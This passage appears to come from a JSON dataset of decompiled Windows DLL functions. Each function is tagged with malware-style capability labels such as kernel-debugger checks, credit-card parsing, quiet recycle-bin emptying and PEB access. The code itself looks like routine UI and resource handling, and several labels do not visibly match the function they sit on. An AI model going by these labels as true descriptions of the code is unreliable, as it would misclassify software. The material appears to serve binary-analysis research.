        "decompiled_code": "\nuint64_t fcn.18002cab4(uint32_t *arg1)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint16_t *puVar5;\n    int16_t iVar6;\n    bool bVar7;\n    \n    bVar7 = *(arg1 + 2) == -1;\n    iVar3 = fcn.18002ca5c(arg1);\n    if (*(arg1 + 2) == -1) {\n        uVar2 = arg1[3];\n    }\n    else {\n        uVar2 = *arg1;\n    }\n    if ((uVar2 & 0x40) != 0) {\n        iVar3 = iVar3 + ((-bVar7 & 2) + 1) * 2;\n        iVar4 = fcn.180033b84(iVar3);\n        iVar3 = iVar3 + 2 + iVar4 * 2;\n    }\n    if (bVar7) {\n        iVar6 = *(arg1 + 4);\n    }\n    else {\n        iVar6 = *(arg1 + 2);\n    }\n    if (iVar6 != 0) {\n        do {\n            puVar5 = (iVar3 + 3U & 0xfffffffffffffffc) + (-bVar7 & 6) + 0x12;\n            if (*puVar5 == 0xffff) {\n                puVar5 = puVar5 + 2;\n            }\n            else {\n                do {\n                    uVar1 = *puVar5;\n                    puVar5 = puVar5 + 1;\n                } while (uVar1 != 0);\n            }\n            if (*puVar5 == 0xffff) {\n                puVar5 = puVar5 + 2;\n            }\n            else {\n                do {\n                    uVar1 = *puVar5;\n                    puVar5 = puVar5 + 1;\n                } while (uVar1 != 0);\n            }\n            uVar1 = *puVar5;\n            if ((uVar1 != 0) && (!bVar7)) {\n                uVar1 = uVar1 - 2;\n            }\n            iVar6 = iVar6 + -1;\n            iVar3 = puVar5 + uVar1 + 2;\n        } while (iVar6 != 0);\n    }\n    return iVar3 - arg1 & 0xffffffff;\n}\n",
        "token_count": 526
    },
    "18002cc8": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nulong fcn.18002cc84(ulong *hMem, ulong arg2)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t *arg1;\n    ushort *puVar6;\n    ulong uVar7;\n    uint64_t arg2_00;\n    int64_t arg2_01;\n    uint32_t uVar8;\n    uint64_t arg1_00;\n    int32_t iVar9;\n    ushort in_R8W;\n    uint64_t arg3;\n    bool bVar10;\n    \n    if (*(hMem + 1) != 0) {\n        arg1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*hMem);\n        bVar10 = *(arg1 + 2) == -1;\n        if (*(arg1 + 2) == -1) {\n            uVar8 = arg1[3];\n        }\n        else {\n            uVar8 = *arg1;\n        }\n        iVar9 = (-bVar10 & 2) + 1;\n        iVar5 = iVar9 * 2;\n        if (bVar10) {\n            arg1[3] = arg1[3] | 0x40;\n        }\n        else {\n            *arg1 = *arg1 | 0x40;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg2);\n        if ((iVar3 < 0x20) && (iVar3 = iVar5 + 2 + iVar3 * 2,  iVar5 <= iVar3)) {\n            puVar6 = fcn.18002ca5c(arg1);\n            iVar4 = 0;\n            if ((uVar8 & 0x40) != 0) {\n                iVar4 = fcn.180033b84(iVar5 + puVar6);\n                iVar4 = iVar5 + 2 + iVar4 * 2;\n            }\n            arg3 = iVar4 + 3 + puVar6 & 0xfffffffffffffffc;\n            arg1_00 = iVar3 + 3 + puVar6 & 0xfffffffffffffffc;\n            if (bVar10) {\n                iVar2 = *(arg1 + 4);\n            }\n            else {\n                iVar2 = *(arg1 + 2);\n            }\n            if ((iVar3 != iVar4) && (iVar2 != 0)) {\n                arg2_00 = (*(hMem + 1) - arg3) + arg1;\n                if (*(hMem + 1) < arg2_00) {\n                    return 0;\n                }\n                iVar4 = fcn.180033080(arg1_00, arg2_00, arg3, arg2_00);\n                if (iVar4 != 0) {\n                    if (iVar4 == 0xc) {\n                        fcn.1800124cc();\n                        pcVar1 = swi(3);\n                        uVar7 = (*pcVar1)();\n                        return uVar7;\n                    }\n                    if ((iVar4 == 0x16) || (iVar4 == 0x22)) {\n                        fcn.180012514();\n                        pcVar1 = swi(3);\n                        uVar7 = (*pcVar1)();\n                        return uVar7;\n                    }\n                    if (iVar4 != 0x50) {\n                        fcn.180012514();\n                        pcVar1 = swi(3);\n                        uVar7 = (*pcVar1)();\n                        return uVar7;\n                    }\n                }\n            }\n            arg2_01 = iVar3 + iVar9 * -2;\n            *puVar6 = in_R8W;\n            iVar5 = fcn.180033080(iVar5 + puVar6, arg2_01, arg2, arg2_01);\n            if (iVar5 != 0) {\n                if (iVar5 == 0xc) {\n                    fcn.1800124cc();\n                    pcVar1 = swi(3);\n                    uVar7 = (*pcVar1)();\n                    return uVar7;\n                }\n                if ((iVar5 == 0x16) || (iVar5 == 0x22)) {\n                    fcn.180012514();\n                    pcVar1 = swi(3);\n                    uVar7 = (*pcVar1)();\n                    return uVar7;\n                }\n                if (iVar5 != 0x50) {\n                    fcn.180012514();\n                    pcVar1 = swi(3);\n                    uVar7 = (*pcVar1)();\n                    return uVar7;\n                }\n            }\n            *(hMem + 1) = *(hMem + 1) + (arg1_00 - arg3);\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*hMem);\n            *(hMem + 0xc) = 0;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1061
    },
    "1800096a": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint64_t fcn.1800096ac(int64_t arg1, uint64_t arg2, ulong noname_2, code *arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    ulong *in_stack_00000028;\n    uint64_t in_stack_00000030;\n    int64_t *in_stack_00000038;\n    \n    if (arg1 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        uVar3 = (*pcVar1)();\n        return uVar3;\n    }\n    if (in_stack_00000038 != NULL) {\n        *in_stack_00000038 = arg1;\n        in_stack_00000038[1] = arg4;\n        return 1;\n    }\n    if (in_stack_00000030 < 0x40) {\n        if (in_stack_00000030 == 0x3f) {\n            if (in_stack_00000028 == NULL) {\n                fcn.180012514();\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n            (*arg4)(arg1, arg2, in_stack_00000028[1], *in_stack_00000028);\n            return 1;\n        }\n        if (in_stack_00000030 == 0x39) {\n            (*arg4)();\n            return 1;\n        }\n        if (in_stack_00000030 == 0x3a) {\n            uVar2 = (*arg4)();\n        }\n        else {\n            if (in_stack_00000030 == 0x3b) {\n                (*arg4)();\n                return 1;\n            }\n            if (in_stack_00000030 == 0x3c) {\n                uVar2 = (*arg4)();\n            }\n            else {\n                if (in_stack_00000030 == 0x3d) {\n                    if (in_stack_00000028 == NULL) {\n                        fcn.180012514();\n                        pcVar1 = swi(3);\n                        uVar3 = (*pcVar1)();\n                        return uVar3;\n                    }\n                    (*arg4)(arg1, in_stack_00000028[1], *in_stack_00000028);\n                    return 1;\n                }\n                if (in_stack_00000030 != 0x3e) {\n                    return 0;\n                }\n                if (in_stack_00000028 == NULL) {\n                    fcn.180012514();\n                    pcVar1 = swi(3);\n                    uVar3 = (*pcVar1)();\n                    return uVar3;\n                }\n                uVar2 = (*arg4)(arg1, in_stack_00000028[1], *in_stack_00000028);\n            }\n        }\n    }\n    else if (in_stack_00000030 == 0x40) {\n        if (in_stack_00000028 == NULL) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            uVar3 = (*pcVar1)();\n            return uVar3;\n        }\n        uVar2 = (*arg4)(arg1, arg2, in_stack_00000028[1], *in_stack_00000028);\n    }\n    else {\n        if (in_stack_00000030 == 0x41) {\n            if (in_stack_00000028 == NULL) {\n                fcn.180012514();\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n            (*arg4)(arg1, in_stack_00000028);\n        }\n        else {\n            if (in_stack_00000030 != 0x42) {\n                if (in_stack_00000030 == 0x43) {\n                    (*arg4)(arg1, in_stack_00000028);\n                    return 1;\n                }\n                if (in_stack_00000030 != 0x44) {\n                    return 0;\n                }\n                uVar2 = (*arg4)(arg1, in_stack_00000028);\n                goto code_r0x00018000981f;\n            }\n            if (in_stack_00000028 == NULL) {\n                fcn.180012514();\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n            (*arg4)(arg1, in_stack_00000028, arg2 & 0xffffffff);\n        }\n        uVar2 = *(in_stack_00000028 + 0x2c) == 0;\n        *(in_stack_00000028 + 0x2c) = 0;\n    }\ncode_r0x00018000981f:\n    return uVar2;\n}\n",
        "token_count": 1058
    },
    "180009cf": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.180009cf0(ulong noname_0, ulong arg2)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int64_t iVar8;\n    uint16_t uVar9;\n    uint8_t *puVar10;\n    int32_t iVar11;\n    uchar auStack200 [32];\n    uchar *puStack168;\n    uchar auStack152 [128];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180067ce0 ^ auStack200;\n    uVar3 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n    iVar6 = uVar3;\n    iVar7 = uVar3 >> 0x10;\n    if ((4 < iVar6) && (iVar8 = 5,  5 < iVar7)) {\n        if (0x20 < iVar6) {\n            iVar6 = 0x20;\n        }\n        iVar5 = iVar6 + 0xf >> 4;\n        iVar11 = (iVar5 * 0x10 + (iVar6 + -4) / 2) - iVar6;\n        if (0xc < iVar11) {\n            iVar11 = 0xc;\n        }\n        if (0x20 < iVar7) {\n            iVar7 = 0x20;\n        }\n        fcn.180033c90(auStack152, 0xff, 0x80);\n        puVar10 = 0x18004cdd0;\n        puVar4 = auStack152 + (iVar7 + -6 >> 1) * iVar5 * 2;\n        do {\n            uVar1 = *puVar10;\n            puVar10 = puVar10 + 1;\n            uVar9 = ~(uVar1 << (iVar11 & 0x1f));\n            puVar4[1] = uVar9;\n            *puVar4 = uVar9 >> 8;\n            puVar4 = puVar4 + iVar5 * 2;\n            iVar8 = iVar8 + -1;\n        } while (iVar8 != 0);\n        puStack168 = auStack152;\n        *0x18006d2d0 = (*_sym.imp.GDI32.dll_CreateBitmap)(iVar6, iVar7, 1);\n        if (*0x18006d2d0 == 0) {\n            *0x18006d2d0 = (*_sym.imp.USER32.dll_LoadBitmapW)(0, 0x7fe3);\n        }\n        fcn.180032ea0(uStack24 ^ auStack200);\n        return;\n    }\n    fcn.180012514();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 624
    },
    "180017ad": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint64_t fcn.180017ad8(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int64_t iVar3;\n    \n    iVar3 = fcn.180028cec(0x180069c00, 0x180010dc0);\n    if (iVar3 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        iVar3 = (*pcVar1)();\n        return iVar3;\n    }\n    uVar2 = (*_sym.imp.USER32.dll_GetMessageTime)();\n    *(iVar3 + 0xb8) = uVar2;\n    uVar2 = (*_sym.imp.USER32.dll_GetMessagePos)();\n    *(iVar3 + 0xbc) = CONCAT44(uVar2 >> 0x10, uVar2);\n    return iVar3 + 0x98;\n}\n",
        "token_count": 188
    },
    "18001b03": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint64_t fcn.18001b034(ulong arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t *in_stack_00000028;\n    uchar auStack40 [8];\n    int64_t iStack32;\n    int32_t iStack24;\n    \n    if (arg2 < 0x2b) {\ncode_r0x00018001b082:\n        if (arg2 - 0x132 < 7) {\n            iStack24 = arg2 - 0x132;\n            iStack32 = arg3;\n            uVar1 = fcn.18001a24c(arg1, 0xbc19, 0, auStack40);\n            return -(*in_stack_00000028 != 0) & uVar1;\n        }\ncode_r0x00018001b158:\n        uVar3 = 0;\n    }\n    else {\n        if ((0x2f < arg2) && (arg2 != 0x39)) {\n            if (arg2 == 0x4e) {\n                iStack32 = arg4;\n                uVar3 = fcn.180009830(arg1, 0, *(arg4 + 0x10) | 0xbc4e0000, auStack40);\n                return uVar3;\n            }\n            if (arg2 == 0x111) {\n                iVar2 = fcn.180009830(arg1, 0, arg3 >> 0x10 | 0xbd110000, 0);\n                if (iVar2 != 0) {\n                    if (in_stack_00000028 == NULL) {\n                        return 1;\n                    }\n                    *in_stack_00000028 = 1;\n                    return 1;\n                }\n                goto code_r0x00018001b158;\n            }\n            if ((arg2 < 0x114) || ((0x115 < arg2 && (arg2 != 0x210)))) goto code_r0x00018001b082;\n        }\n        uVar3 = fcn.18001a24c(arg1, arg2 + 0xbc00, arg3, arg4);\n    }\n    return uVar3;\n}\n",
        "token_count": 501
    },
    "18002a6c": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint64_t fcn.18002a6c4(int64_t hWnd)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    \n    uVar1 = (*_sym.imp.USER32.dll_SendMessageW)(*(hWnd + 0x40), 0x400, 0, 0);\n    uVar2 = 1;\n    if (uVar1 >> 0x10 == 0x534b) {\n        uVar2 = uVar1 & 0xffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 121
    },
    "180021bb": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nulong fcn.180021bb4(int64_t arg1, uint64_t arg2, uint *arg3)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    ulong uVar3;\n    uint64_t *puVar4;\n    uint64_t uVar5;\n    \n    uVar5 = 0;\n    if (arg3 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar2 = swi(3);\n        uVar3 = (*pcVar2)();\n        return uVar3;\n    }\n    if (*(arg1 + 0x38) == '\\0') {\n        iVar1 = *(*(arg1 + 0x28) + 0x10);\n        if (arg2 <= *(arg1 + 0x18) + -1 + iVar1) {\n            uVar5 = arg2 - iVar1;\ncode_r0x000180021c1f:\n            *arg3 = *((*(*(arg1 + 0x28) + 0x20 + uVar5 * 0x50) + 7 + *(*(arg1 + 0x28) + 8 + uVar5 * 0x50) &\n                      0xfffffffffffffff8U) + 8 + *(arg1 + 0x10));\n            return 1;\n        }\n    }\n    else if (*(arg1 + 0x18) != 0) {\n        puVar4 = *(arg1 + 0x28) + 0x10;\n        do {\n            if (*puVar4 == arg2) goto code_r0x000180021c1f;\n            uVar5 = uVar5 + 1;\n            puVar4 = puVar4 + 10;\n        } while (uVar5 < *(arg1 + 0x18));\n    }\n    return 0;\n}\n",
        "token_count": 405
    },
    "18002fd7": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint64_t fcn.18002fd78(uint8_t *arg1)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    uint64_t uVar3;\n    uint16_t in_DX;\n    int64_t iVar4;\n    \n    if (0x15 < in_DX) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        uVar3 = (*pcVar2)();\n        return uVar3;\n    }\n    uVar3 = *(in_DX * 4 + 0x1800532c0) + 0xfU & 0xfffffff8;\n    do {\n        uVar1 = *arg1;\n        if (uVar1 == 0) {\n            return uVar3;\n        }\n        if (uVar1 != 0xff) {\n            iVar4 = 0x180053260;\n            if ((uVar1 & 0x40) == 0) {\n                iVar4 = 0x180053200;\n            }\n            if (0x15 < (uVar1 & 0xbf)) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                uVar3 = (*pcVar2)();\n                return uVar3;\n            }\n            uVar3 = *(iVar4 + (uVar1 & 0xbf) * 4) + 7 + uVar3 & 0xfffffff8;\n        }\n        arg1 = arg1 + 1;\n    } while( true );\n}\n",
        "token_count": 329
    },
    "18002141": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.180021410(int64_t arg1, ulong noname_1, ulong arg3, uint32_t *arg4)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint uStack56;\n    uint uStack52;\n    ulong uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    uint uStack20;\n    uint uStack12;\n    \n    uStack12 = 1;\n    if ((((noname_1 & 1) != 0) || ((noname_1 & 2) != 0)) && (uVar2 = 0,  arg3 != 0)) {\n        do {\n            uVar1 = *arg4;\n            if (0x13 < uVar1) {\n                if (uVar1 == 0x14) {\ncode_r0x0001800214bd:\n                    uStack12 = 5;\n                    goto code_r0x0001800214c2;\n                }\n                if (uVar1 != 0x15) {\n                    if (uVar1 == 0x17) goto code_r0x000180021454;\n                    if (uVar1 == 0x18) {\n                        uStack12 = 2;\n                        goto code_r0x0001800214c2;\n                    }\n                    if (uVar1 == 0x19) goto code_r0x0001800214c2;\n                    if (uVar1 == 0x1f) {\n                        uStack12 = 4;\n                        goto code_r0x0001800214c2;\n                    }\n                    goto code_r0x000180021496;\n                }\ncode_r0x000180021474:\n                uStack12 = 7;\ncode_r0x0001800214c2:\n                uStack52 = 0xffffffff;\n                uStack56 = 3;\n                uStack48 = 0;\n                uStack40 = 0;\n                uStack32 = 0;\n                uStack20 = 0;\n                fcn.18001e6f8(arg1 + -0x170, &uStack56);\n                return uStack20;\n            }\n            if (uVar1 == 0x13) goto code_r0x000180021474;\n            if (uVar1 < 9) {\n                if (5 < uVar1) goto code_r0x000180021474;\n                if (uVar1 == 1) {\n                    uStack12 = 3;\n                    goto code_r0x0001800214c2;\n                }\n                if (uVar1 == 2) goto code_r0x0001800214bd;\n                if (uVar1 == 3) goto code_r0x000180021454;\n            }\n            else if (8 < uVar1) {\n                if (uVar1 < 0xb) {\ncode_r0x000180021454:\n                    uStack12 = 6;\n                    goto code_r0x0001800214c2;\n                }\n                if ((uVar1 < 0xd) || ((0xe < uVar1 && (uVar1 < 0x11)))) goto code_r0x000180021474;\n            }\ncode_r0x000180021496:\n            uVar2 = uVar2 + 1;\n            arg4 = arg4 + 0xe;\n        } while (uVar2 < arg3);\n    }\n    return 0;\n}\n",
        "token_count": 745
    },
    "18000d07": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472",
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9"
        ],
        "decompiled_code": "\nvoid fcn.18000d078(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t *piVar1;\n    uint auStack56 [2];\n    int64_t *piStack48;\n    ulong uStack40;\n    ulong uStack32;\n    uint *puStack24;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack40 = 0xfffffffffffffffe;\n    piStack48 = NULL;\n    fcn.18000cc2c(arg1, arg2, &piStack48, 0);\n    piVar1 = piStack48;\n    if (piStack48 != NULL) {\n        uStack16 = 1;\n        uStack12 = 1;\n        auStack56[0] = 0xfffffffd;\n        puStack24 = auStack56;\n        uStack32 = arg4;\n        (**(*piStack48 + 0x30))(piStack48, arg3, 0x180056038, 0x400, 4, &uStack32, 0, 0, 0);\n        (**(*piVar1 + 0x10))(piVar1);\n    }\n    return;\n}\n",
        "token_count": 261
    },
    "1800103c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid fcn.1800103c0(ulong noname_0, int64_t arg2, ulong arg3, uint64_t arg4)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t *piVar6;\n    int64_t iVar7;\n    uint64_t arg2_00;\n    uint *puVar8;\n    uint32_t *puVar9;\n    uchar *puVar10;\n    uint64_t arg3_00;\n    int32_t iVar11;\n    uint *puVar12;\n    uint *in_stack_00000028;\n    int16_t in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    uint32_t in_stack_00000040;\n    ulong *in_stack_00000048;\n    ulong var_98h;\n    uchar auStack392 [32];\n    uint uStack360;\n    int32_t *piStack352;\n    uint32_t uStack344;\n    uchar *puStack336;\n    uint32_t uStack328;\n    int64_t iStack320;\n    int64_t *piStack312;\n    uint16_t uStack296;\n    uint16_t uStack294;\n    int64_t iStack288;\n    uint64_t uStack280;\n    uint32_t uStack272;\n    uint uStack268;\n    uint32_t uStack264;\n    int64_t iStack256;\n    uint uStack248;\n    uint uStack244;\n    ushort uStack240;\n    ushort uStack238;\n    ushort uStack236;\n    int16_t iStack234;\n    ushort uStack232;\n    ulong *puStack224;\n    int32_t iStack216;\n    int32_t iStack212;\n    int32_t iStack208;\n    uint32_t uStack204;\n    ulong uStack200;\n    int64_t iStack192;\n    ulong uStack184;\n    int64_t iStack176;\n    uchar auStack168 [80];\n    uchar auStack88 [16];\n    uint64_t uStack72;\n    \n    uStack184 = 0xfffffffffffffffe;\n    uStack72 = *0x180067ce0 ^ auStack392;\n    uStack200 = arg3;\n    iStack192 = arg2;\n    puStack224 = in_stack_00000048;\n    puVar12 = in_stack_00000028 + 0x12;\n    iVar5 = 0;\n    puVar8 = in_stack_00000028;\n    if (arg4 != 0) {\n        uStack248 = in_stack_00000028[2];\n        uStack244 = in_stack_00000028[1];\n        uStack240 = *(in_stack_00000028 + 3);\n        uStack238 = *(in_stack_00000028 + 0xe);\n        uStack236 = *(in_stack_00000028 + 4);\n        iStack234 = *puVar12;\n        uStack232 = *(in_stack_00000028 + 5);\n        puVar8 = &uStack248;\n        puVar12 = in_stack_00000028 + 6;\n    }\n    iStack212 = *(puVar8 + 10);\n    uStack204 = *(puVar8 + 0xe) + iStack212;\n    arg3_00 = uStack204;\n    iStack216 = *(puVar8 + 2);\n    iStack208 = *(puVar8 + 3) + iStack216;\n    (*_sym.imp.USER32.dll_MapDialogRect)(*(arg2 + 0x40), &iStack216);\n    if (3 < in_stack_00000040) {\n        uVar2 = *in_stack_00000038;\n        in_stack_00000038 = in_stack_00000038 + 1;\n        in_stack_00000040 = in_stack_00000040 - 4;\n        if (uVar2 != 0) {\n            iVar5 = (*_sym.imp.OLEAUT32.dll_SysReAllocStringLen)(in_stack_00000038, uVar2);\n            in_stack_00000038 = in_stack_00000038 + uVar2 * 2;\n            in_stack_00000040 = in_stack_00000040 + uVar2 * -2;\n        }\n    }\n    uStack280 = 0;\n    piVar6 = fcn.180012330();\n    if (piVar6 != NULL) {\n        iVar7 = (**(*piVar6 + 0x18))();\n        iVar7 = iVar7 + 0x18;\n        uStack296 = 0;\n        uStack272 = 0;\n        uStack268 = 0;\n        iStack256 = iVar7;\n        if ((in_stack_00000030 == 0x37a) || (in_stack_00000030 == 0x37b)) {\n            uStack264 = *in_stack_00000038;\n            iVar11 = uStack264 - 0xc;\n            in_stack_00000038 = in_stack_00000038 + 3;\n            arg2_00 = uStack280;\n            while (iVar11 != 0) {\n                uStack280 = uStack280 & 0xffffffff00000000 | *in_stack_00000038;\n                uStack294 = *(in_stack_00000038 + 1);\n                puVar9 = in_stack_00000038 + 6;\n                iVar11 = iVar11 + -6;\n                if (*in_stack_00000038 == 0x80010001) {\n                    uStack272 = *puVar9;\n                    uStack268 = *(in_stack_00000038 + 10);\n                    fcn.18000e6c4(&iStack256, in_stack_00000038 + 0x16, arg3_00, arg4);\n                    iVar11 = iVar11 + (-0x11 - *(iStack256 + -0x10));\n                    iVar7 = iStack256;\n                    in_stack_00000038 = in_stack_00000038 + 0x16 + *(iStack256 + -0x10) + 1;\n                    uStack296 = uStack294;\n                }\n                else {\n                    iStack176 = fcn.180009660(0x28);\n                    in_stack_00000038 = puVar9;\n                    if (iStack176 == 0) {\n                        arg2_00 = 0;\n                    }\n                    else {\n                        arg4 = uStack294;\n                        arg3_00 = uStack280 & 0xffffffff;\n                        arg2_00 = fcn.18001f238(iStack176, arg2_00, arg3_00);\n                    }\n                }\n            }\n            in_stack_00000040 = in_stack_00000040 - uStack264;\n            in_stack_00000030 = in_stack_00000030 + -4;\n            uStack280 = arg2_00;\n        }\n        if (*puVar12 == 0x7b) {\n            iVar11 = (*_sym.imp.ole32.dll_CLSIDFromString)(puVar12, auStack88);\n        }\n        else {\n            iVar11 = (*_sym.imp.ole32.dll_CLSIDFromProgID)(puVar12, auStack88);\n        }\n        fcn.18002c0e0(auStack168, in_stack_00000038, in_stack_00000040, 0);\n        iVar4 = iStack192;\n        puVar10 = auStack168;\n        if (in_stack_00000030 == 0x378) {\n            puVar10 = NULL;\n        }\n        iStack288 = 0;\n        if ((-1 < iVar11) && (iVar11 = fcn.180026d44(iStack192, 1),  iVar11 != 0)) {\n            piStack312 = &iStack288;\n            uStack328 = in_stack_00000030 == 0x377;\n            uStack344 = *(puVar8 + 4);\n            piStack352 = &iStack216;\n            uStack360 = *puVar8;\n            puStack336 = puVar10;\n            iStack320 = iVar5;\n            iVar11 = fcn.1800275f4(*(iVar4 + 0x98), 0, auStack88, 0);\n            if (iVar11 != 0) {\n                fcn.18001e5c4(iStack288, 1);\n                uStack344 = 0x13;\n                piStack352 = piStack352 & 0xffffffff00000000;\n                uStack360 = 0;\n                (*_sym.imp.USER32.dll_SetWindowPos)(*(iStack288 + 0x48), uStack200, 0, 0);\n                *(iStack288 + 0xe0) = uStack280;\n                fcn.180008c54(iStack288 + 0xf8, &iStack256);\n                *(iStack288 + 0xe8) = uStack296;\n                *(iStack288 + 0xf0) = uStack272;\n                *(iStack288 + 0xf4) = uStack268;\n            }\n        }\n        if (iVar5 != 0) {\n            (*_sym.imp.OLEAUT32.dll_SysStringLen)(iVar5);\n        }\n        if (iStack288 == 0) {\n            *puStack224 = 0;\n            fcn.18002c564(auStack168);\n            LOCK();\n            piVar1 = iVar7 + -8;\n            iVar11 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar11 + -1 < 1) {\n                (**(**(iVar7 + -0x18) + 8))();\n            }\n        }\n        else {\n            *puStack224 = *(iStack288 + 0x48);\n            fcn.18002c564(auStack168);\n            LOCK();\n            piVar1 = iVar7 + -8;\n            iVar11 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar11 + -1 < 1) {\n                (**(**(iVar7 + -0x18) + 8))();\n            }\n        }\n        fcn.180032ea0(uStack72 ^ auStack392);\n        return;\n    }\n    fcn.180001214(0x80004005);\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 2284
    },
    "180012fa": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nint64_t fcn.180012fa8(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    iVar1 = arg1[1];\n    if (iVar1 != 0) {\n        iVar2 = fcn.1800140a8();\n        if (*(iVar2 + 0x38) != 0) {\n            fcn.18002d184(*(iVar2 + 0x38) + 0x30, arg1[1]);\n        }\n    }\n    (**(*arg1 + 0x28))(arg1);\n    arg1[1] = 0;\n    return iVar1;\n}\n",
        "token_count": 144
    },
    "18001331": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nint64_t fcn.180013310(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    iVar1 = *(arg1 + 8);\n    if (iVar1 != 0) {\n        iVar2 = fcn.1800140a8();\n        if (*(iVar2 + 0x40) != 0) {\n            fcn.18002d184(*(iVar2 + 0x40) + 0x30, *(arg1 + 8));\n        }\n    }\n    *(arg1 + 8) = 0;\n    return iVar1;\n}\n",
        "token_count": 134
    },
    "18001440": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180014404(ulong arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.1800140a8();\n    if (*(iVar1 + 0x30) != 0) {\n        fcn.18002d110(*(iVar1 + 0x30) + 0x30, arg1);\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "18001446": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nint64_t fcn.18001446c(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    iVar1 = *(arg1 + 8);\n    if (iVar1 != 0) {\n        iVar2 = fcn.1800140a8();\n        if (*(iVar2 + 0x30) != 0) {\n            fcn.18002d184(*(iVar2 + 0x30) + 0x30, *(arg1 + 8));\n        }\n    }\n    *(arg1 + 8) = 0;\n    return iVar1;\n}\n",
        "token_count": 135
    },
    "180017c7": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180017c7c(ulong arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.1800140a8();\n    if (*(iVar1 + 0x28) != 0) {\n        fcn.18002d110(*(iVar1 + 0x28) + 0x30, arg1);\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "180017d0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
